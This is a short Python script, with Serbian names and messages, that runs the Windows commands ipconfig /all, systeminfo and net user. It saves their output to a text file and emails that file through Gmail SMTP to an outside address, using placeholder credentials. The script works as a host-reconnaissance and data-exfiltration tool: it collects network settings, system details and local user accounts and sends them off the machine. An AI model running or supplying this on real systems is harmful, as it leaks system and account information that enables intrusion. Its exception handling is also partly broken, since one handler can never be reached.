import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

naziv_fajla = "ipinfo.txt"

komande = [
    ("IP INFO (ipconfig)", ["ipconfig", "/all"]),
    ("SYSTEM INFO (systeminfo)", ["systeminfo"]),
    ("USER INFO (net user)", ["net", "user"])
]

sender_email = "Your_mail"
receiver_email = "Recivers_mail"
password = "App_Password"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "Mail Subject"

body = "Mail Message."
message.attach(MIMEText(body, "plain"))

filename = f"{naziv_fajla}"

try:
    with open(naziv_fajla, "w", encoding="utf-8") as f:
        for naslov, komanda in komande:
            print(f"Starting: {naslov}...")
                
            rezultat = subprocess.run(komanda, capture_output=True, text=True, shell=True)
                
            f.write("="*50 + "\n")
            f.write(f"{naslov}\n")
            f.write("="*50 + "\n")
            f.write(rezultat.stdout)
            f.write("\n\n")
                
        print(f"\nAll Done. Saved as: {naziv_fajla}")

except Exception as e:
    print(f"Error: {e}")

except FileNotFoundError:
    print("Greška: Fajl nije pronađen.")

except Exception as e:
    print(f"Došlo je do greške: {e}")
    
else:
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(message)
        
    print("All done! Mail sent.")